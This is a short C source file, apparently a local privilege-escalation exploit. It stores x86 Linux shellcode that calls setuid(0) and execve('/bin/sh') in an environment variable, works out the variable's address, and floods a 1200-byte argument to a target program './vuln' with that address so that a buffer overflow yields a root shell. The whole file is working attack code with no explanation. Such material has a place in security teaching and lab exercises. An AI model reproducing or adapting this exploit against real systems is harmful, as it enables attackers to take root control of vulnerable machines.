#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define VICTIM "./vuln"
#define BSIZE  1200

extern char **environ;

char shellcode[] = "\x31\xdb\x89\xd8\xb0\x17\xcd\x80" /*setuid(0) */
              "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
              "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb"
"\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(int argc, char **argv) {
  char *c0de, *envy;
  int i, align;
  unsigned long addr;

  if((envy = getenv("AAAAAAA")) == NULL) {
    printf("Rexecuting\n");
    setenv("AAAAAAA", shellcode, 1);
    execve(argv[0], argv, environ);
  }

  align = strlen(argv[0]) - strlen(VICTIM);
  addr = (long)envy + align;

  c0de = (char *)malloc(BSIZE);

  for(i = 0; i < BSIZE; i += 4)
    *(unsigned long *)&c0de[i] = addr;

  execle(VICTIM, VICTIM, c0de, NULL, environ);
  return 0;
}
